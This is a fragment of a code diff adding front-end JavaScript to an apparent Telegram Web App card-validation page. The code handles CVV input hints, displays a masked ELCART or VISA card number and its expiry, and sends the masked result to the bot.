+    submitted = false;
+    check();
+  });
+
+  cvEl.addEventListener('input', () => {
+    if (cvEl.value.length === 3) {
+      cvEl.className = 'v-ok';
+      cvHint.textContent = 'CVV введён';
+      cvHint.className = 'hint ok';
+      dot3.className = 'status-dot ok';
+    } else {
+      cvEl.className = '';
+      cvHint.textContent = '';
+      dot3.className = 'status-dot';
+    }
+    result.classList.remove('show');
+    submitted = false;
+    check();
+  });
+
+  btn.addEventListener('click', () => {
+    const raw = cnEl.value;
+    const masked = raw.slice(0, 9) + ' ****' + ' ' + raw.slice(-4);
+    document.getElementById('r_sys').textContent = cardType === 'elcart' ? 'ЭЛКАРТ (ЗАО МПЦ)' : 'VISA International';
+    document.getElementById('r_num').textContent = masked;
+    document.getElementById('r_exp').textContent = cdEl.value;
+    result.classList.add('show');
+    submitted = true;
+    btn.disabled = true;
+    btn.classList.add('success');
+    btn.textContent = '✓ Карта валидна';
+
+    // Telegram: отправляем результат боту
+    try {
+      const tg = window.Telegram.WebApp;
+      tg.sendData(JSON.stringify({
+        card: masked,
+        exp: cdEl.value,
+        system: cardType === 'elcart' ? 'ELCART' : 'VISA',
+        luhn: true
+      }));
+    } catch(e) {}
+
+    // Скролл к результату
+    setTimeout(() => result.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 100);
+  });
 </script>
 </body>
 </html>
